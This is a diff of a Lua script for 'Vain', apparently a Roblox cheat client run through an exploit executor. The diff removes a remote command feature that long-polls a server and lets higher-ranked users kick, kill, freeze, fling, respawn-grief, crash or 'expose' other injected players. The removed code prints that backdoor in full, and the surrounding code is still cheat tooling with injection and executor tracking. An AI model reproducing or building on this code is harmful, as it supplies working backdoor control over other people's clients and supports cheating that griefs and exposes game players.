@@ -247,94 +247,6 @@ local function apiRequest(method, path, body)
 	return ok and res and res.Body or nil
 end
 
-local function executeCommand(command, args)
-	local lp   = playersService.LocalPlayer
-	local char = lp.Character
-	local hrp  = char and char:FindFirstChild('HumanoidRootPart')
-	local hum  = char and char:FindFirstChildOfClass('Humanoid')
-
-	if command == 'kick' then
-		lp:Kick('[Vain] You have been kicked.')
-	elseif command == 'kill' then
-		if hum then hum.Health = 0 end
-	elseif command == 'freeze' then
-		task.spawn(function()
-			local end_t = tick() + 30
-			while tick() < end_t and hrp do
-				hrp.Velocity    = Vector3.zero
-				hrp.RotVelocity = Vector3.zero
-				hrp.Anchored    = true
-				task.wait(0.1)
-			end
-			if hrp then hrp.Anchored = false end
-		end)
-	elseif command == 'crash' then
-		task.spawn(function() while true do end end)
-	elseif command == 'expose' then
-		local info = lp.Name..' | '..tostring(lp.UserId)..' | '..(identifyexecutor and identifyexecutor() or 'unknown executor')
-		if vain then vain:CreateNotification('Exposed', info, 15, 'alert') end
-		setclipboard(info)
-	elseif command == 'fling' then
-		if hrp then hrp.Velocity = Vector3.new(math.random(-500,500), 1000, math.random(-500,500)) end
-	elseif command == 'spin' then
-		task.spawn(function()
-			local end_t = tick() + 30
-			while tick() < end_t and hrp do
-				hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(20), 0)
-				task.wait()
-			end
-		end)
-	elseif command == 'loopkill' then
-		task.spawn(function()
-			local end_t = tick() + 60
-			while tick() < end_t do
-				local h = lp.Character and lp.Character:FindFirstChildOfClass('Humanoid')
-				if h then h.Health = 0 end
-				task.wait(3)
-			end
-		end)
-	elseif command == 'annoy' then
-		task.spawn(function()
-			local end_t = tick() + 30
-			while tick() < end_t do
-				if hrp then hrp.CFrame = hrp.CFrame + Vector3.new(math.random(-3,3), 5, math.random(-3,3)) end
-				task.wait(0.5)
-			end
-		end)
-	elseif command == 'grief' then
-		task.spawn(function()
-			local end_t = tick() + 30
-			while tick() < end_t do
-				lp:LoadCharacter()
-				task.wait(4)
-			end
-		end)
-	elseif command == 'notify' then
-		if vain then vain:CreateNotification('Vain', args or 'Message from admin', 10, 'alert') end
-	end
-end
-
--- Long-poll: server holds the connection open up to 25s and responds the
--- instant a command is queued. We reconnect immediately after each response,
--- so latency is ~500ms worst case instead of up to 5s.
-local function startC2LongPoll()
-	local username = playersService.LocalPlayer.Name
-	task.spawn(function()
-		while vain and vain.Loaded do
-			local body = apiRequest('GET', '/commands/poll?username=' .. username)
-			if body then
-				local ok, data = pcall(httpService.JSONDecode, httpService, body)
-				if ok and data and data.command then
-					pcall(executeCommand, data.command, data.args)
-				end
-			else
-				-- Request failed (no httpRequest available or network error) — back off
-				task.wait(5)
-			end
-		end
-	end)
-end
-
 local function checkWhitelist()
 	local lp = playersService.LocalPlayer
 	if not lp then return end
@@ -363,7 +275,6 @@ end
 -- higher-tier ones. We resolve every current player's tier in one /tiers
 -- request and cache it by lowercase username. Unknown players default to 0 (Free).
 local tierCache = {}
-local injectedNames = {} -- usernames in THIS server currently injected (from /tiers)
 
 local function getAccountTierFor(player)
 	if not player then return 0 end
@@ -388,7 +299,6 @@ local function startTierSync()
 						-- keep the local player authoritative from checkWhitelist
 						tierCache = data.tiers
 						tierCache[tostring(playersService.LocalPlayer.Name):lower()] = vainTier
-						if data.injected then injectedNames = data.injected end
 					end
 				end
 			end
@@ -396,93 +306,10 @@ local function startTierSync()
 		end
 	end)
 end
--- Queue a command for another injected Vain user. The worker enforces the rank
--- rule (you must out-rank the target), so this only succeeds Premium -> Free or
--- Owner -> Free/Premium. Returns ok, message.
-local function sendCommand(target, command, args)
-	if not target or target == '' then return false, 'No target selected' end
-	local body = apiRequest('POST', '/commands/queue', httpService:JSONEncode({
-		from    = playersService.LocalPlayer.Name,
-		target  = target,
-		command = command,
-		args    = args,
-	}))
-	if not body then return false, 'No response (network/executor)' end
-	local ok, data = pcall(httpService.JSONDecode, httpService, body)
-	if ok and data then
-		if data.ok then return true, 'Sent "'..command..'" to '..target end
-		return false, data.error or 'Rejected'
-	end
-	return false, 'Bad response'
-end
-
--- Re-query who in THIS server is currently injected (from /tiers .injected).
-local function refreshInjected()
-	local names = {}
-	for _, plr in ipairs(playersService:GetPlayers()) do table.insert(names, plr.Name) end
-	if #names == 0 then return injectedNames end
-	local body = apiRequest('POST', '/tiers', httpService:JSONEncode({usernames = names}))
-	if body then
-		local ok, data = pcall(httpService.JSONDecode, httpService, body)
-		if ok and data and data.injected then injectedNames = data.injected end
-	end
-	return injectedNames
-end
-
--- Vain Admin module: list injected users in this server + kick lower-ranked ones.
-local function setupAdminModules()
-	if not (vain and vain.Categories and vain.Categories.Utility) then return end
-
-	local Admin = vain.Categories.Utility:CreateModule({
-		Name = 'Vain Admin',
-		Tooltip = 'Kick other injected Vain users in this server. The server enforces rank: you can only target someone BELOW you (Premium kicks Free; Owner kicks Free + Premium). Press List Injected to refresh who is running Vain here.',
-	})
-
-	-- injected users in the server, minus yourself (you cannot target self)
-	local function others()
-		local me, out = playersService.LocalPlayer.Name:lower(), {}
-		for _, n in ipairs(injectedNames) do
-			if n:lower() ~= me then table.insert(out, n) end
-		end
-		if #out == 0 then table.insert(out, '(press List Injected)') end
-		return out
-	end
-
-	local Target = Admin:CreateDropdown({
-		Name    = 'Target',
-		List    = {'(press List Injected)'},
-		Tooltip = 'Injected Vain user to kick. Refresh the list with List Injected.',
-	})
-	Admin:CreateButton({
-		Name = 'List Injected',
-		Function = function()
-			refreshInjected()
-			Target:Change(others())
-			vain:CreateNotification('Injected in server ('..#injectedNames..')',
-				#injectedNames > 0 and table.concat(injectedNames, '\n')
-				or 'No injected Vain users found in this server.', 8)
-		end,
-		Tooltip = 'List every Vain user currently injected in this server and load them into Target.',
-	})
-	Admin:CreateButton({
-		Name = 'Kick',
-		Function = function()
-			local target = Target and Target.Value
-			if not target or target:sub(1, 1) == '(' then
-				vain:CreateNotification('Vain Admin', 'Pick a target first (List Injected).', 5, 'alert')
-				return
-			end
-			local ok, msg = sendCommand(target, 'kick')
-			vain:CreateNotification('Vain Admin', msg, 6, ok and nil or 'alert')
-		end,
-		Tooltip = 'Kick the selected Vain user (server rejects targets you do not out-rank).',
-	})
-end
 -- ── End Vain API ─────────────────────────────────────────────────────────────
 
 local function finishLoading()
 	vain.Init = nil
-	setupAdminModules()
 
 	-- Load saved settings and start the local save loop FIRST. These are fast,
 	-- local-only operations, so the GUI becomes usable immediately.
@@ -493,7 +320,6 @@ local function finishLoading()
 			task.wait(10)
 		until not vain.Loaded
 	end)
-	startC2LongPoll()
 	startTierSync()
 
 	-- The whitelist check, update detection, and the welcome notification each
